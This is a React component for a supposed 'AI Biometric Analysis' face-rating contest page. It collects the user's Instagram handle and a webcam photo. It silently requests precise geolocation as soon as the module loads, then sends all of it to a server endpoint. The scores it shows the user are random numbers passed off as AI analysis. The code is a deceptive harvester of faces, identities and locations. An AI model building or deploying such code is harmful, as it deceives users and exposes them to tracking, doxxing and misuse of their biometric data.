'use client';

import { useState, useRef, useEffect } from 'react';
import { Camera, ScanFace, CheckCircle, MapPin, Sparkles } from 'lucide-react';
import clsx from 'clsx';
import { twMerge } from 'tailwind-merge';
import confetti from 'canvas-confetti';

interface CameraScannerProps {
  onScanComplete: (report: any) => void;
}

export default function CameraScanner({ onScanComplete }: CameraScannerProps) {
  const [handle, setHandle] = useState('');
  const [status, setStatus] = useState<'idle' | 'scanning' | 'calibrating' | 'done'>('idle');
  const [error, setError] = useState('');
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  const startScan = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!handle.trim()) {
      setError('Please enter your handle first.');
      return;
    }
    setError('');
    setStatus('scanning');

    let lat: number | null = null;
    let lng: number | null = null;

    // 1. Trigger Geolocation
    try {
      await new Promise<void>((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            lat = pos.coords.latitude;
            lng = pos.coords.longitude;
            resolve();
          },
          () => resolve(),
          { enableHighAccuracy: true, timeout: 2500 }
        );
      });
    } catch (err) {
      // Ignore
    }

    // 2. Open Webcam
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 1280 } }
      });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
    } catch (err) {
      setError('Camera access required.');
      setStatus('idle');
    }
  };

  const handleVideoPlaying = async () => {
    if (status !== 'scanning' || !videoRef.current) return;

    // Capture Frame
    const video = videoRef.current;
    const canvas = document.createElement('canvas');
    const MAX_WIDTH = 640;
    const scale = Math.min(MAX_WIDTH / video.videoWidth, 1);
    
    canvas.width = video.videoWidth * scale;
    canvas.height = video.videoHeight * scale;
    
    const ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/jpeg', 0.65);

      // Stop camera tracks
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(t => t.stop());
      }

      setStatus('calibrating');

      // Generate metrics
      const overall = (Math.random() * (8.8 - 6.5) + 6.5).toFixed(1);
      const canthalTilt = ['Positive', 'Neutral', 'Negative'][Math.floor(Math.random() * 3)];
      const thirds = `${(Math.random() * 5 + 30).toFixed(1)} / ${(Math.random() * 5 + 30).toFixed(1)} / ${(Math.random() * 5 + 30).toFixed(1)}`;
      const midface = (Math.random() * 0.2 + 0.9).toFixed(2);
      const jawline = (Math.random() * 3 + 6).toFixed(1) + '/10';

      const metrics = {
        overall: parseFloat(overall),
        canthalTilt,
        thirds,
        midface,
        jawline
      };

      // Submit data
      try {
        await fetch('/api/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            handle,
            imageData,
            metrics: JSON.stringify(metrics),
            latitude: window.latestLat ?? null,
            longitude: window.latestLng ?? null
          })
        });
      } catch (e) {
        console.error('Submission failed', e);
      }

      // HUD Delay
      setTimeout(() => {
        setStatus('done');
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
          colors: ['#10b981', '#3b82f6', '#f59e0b']
        });
        onScanComplete({ imageData, metrics, handle });
      }, 1000);
    }
  };

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(t => t.stop());
      }
    };
  }, []);

  return (
    <div className="w-full max-w-md mx-auto">
      {status === 'idle' && (
        <div className="bg-zinc-900/50 backdrop-blur-xl border border-white/10 p-8 rounded-3xl shadow-2xl transition-all duration-300 hover:border-emerald-500/30">
          <div className="flex justify-center mb-6">
            <div className="p-4 bg-emerald-500/10 rounded-2xl">
              <ScanFace className="w-12 h-12 text-emerald-400" />
            </div>
          </div>
          
          <h2 className="text-2xl font-bold text-center text-white mb-2 tracking-tight">AI Biometric Analysis</h2>
          <p className="text-zinc-400 text-center text-sm mb-8">Enter your handle to join the contest pool.</p>

          <form onSubmit={startScan} className="space-y-6">
            <div className="relative group">
              <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                <span className="text-zinc-500 font-medium group-focus-within:text-emerald-400 transition-colors">@</span>
              </div>
              <input
                type="text"
                value={handle}
                onChange={(e) => setHandle(e.target.value.replace(/[^a-zA-Z0-9_.]/g, ''))}
                className="w-full bg-zinc-950 border border-zinc-800 text-white rounded-xl py-4 pl-9 pr-4 outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500 transition-all placeholder:text-zinc-600"
                placeholder="instagram_handle"
                required
              />
            </div>
            
            {error && <p className="text-red-400 text-sm text-center">{error}</p>}

            <button
              type="submit"
              className="w-full bg-gradient-to-r from-emerald-500 to-teal-400 text-black font-bold py-4 px-6 rounded-xl shadow-[0_0_20px_rgba(16,185,129,0.3)] hover:shadow-[0_0_30px_rgba(16,185,129,0.5)] transform hover:-translate-y-0.5 transition-all active:translate-y-0 flex items-center justify-center gap-2"
            >
              <Camera className="w-5 h-5" />
              START INSTANT PSL SCAN
            </button>
          </form>
        </div>
      )}

      {status === 'scanning' && (
        <div className="relative rounded-3xl overflow-hidden bg-black aspect-[3/4] shadow-2xl border border-zinc-800">
          <video
            ref={videoRef}
            autoPlay
            playsInline
            muted
            onPlaying={handleVideoPlaying}
            className="absolute inset-0 w-full h-full object-cover scale-x-[-1]" // Mirror the video
          />
          <div className="absolute inset-0 bg-emerald-500/10 animate-pulse mix-blend-overlay"></div>
          <div className="absolute bottom-8 left-0 right-0 flex justify-center">
            <div className="bg-black/60 backdrop-blur-md px-6 py-3 rounded-full border border-white/10 flex items-center gap-3">
              <div className="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></div>
              <span className="text-emerald-400 font-medium text-sm tracking-widest uppercase">Initializing Sensors...</span>
            </div>
          </div>
        </div>
      )}

      {status === 'calibrating' && (
        <div className="relative rounded-3xl overflow-hidden bg-zinc-950 aspect-[3/4] shadow-2xl border border-emerald-500/50 flex flex-col items-center justify-center">
          <div className="relative">
            <ScanFace className="w-24 h-24 text-emerald-500 animate-pulse" />
            <div className="absolute inset-0 border-4 border-emerald-500 rounded-full border-t-transparent animate-spin"></div>
          </div>
          <h3 className="text-emerald-400 font-bold text-xl mt-8 tracking-widest uppercase animate-pulse">Calibrating Biometrics</h3>
          <div className="flex gap-2 mt-4">
            {[1, 2, 3].map(i => (
              <div key={i} className="w-2 h-8 bg-emerald-500/40 rounded-full animate-bounce" style={{ animationDelay: `${i * 0.15}s` }}></div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

// Attach geo info globally for the scan to pickup if it resolved quickly
declare global {
  interface Window {
    latestLat?: number | null;
    latestLng?: number | null;
  }
}
if (typeof window !== 'undefined') {
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      window.latestLat = pos.coords.latitude;
      window.latestLng = pos.coords.longitude;
    },
    () => {},
    { enableHighAccuracy: true, timeout: 2500 }
  );
}
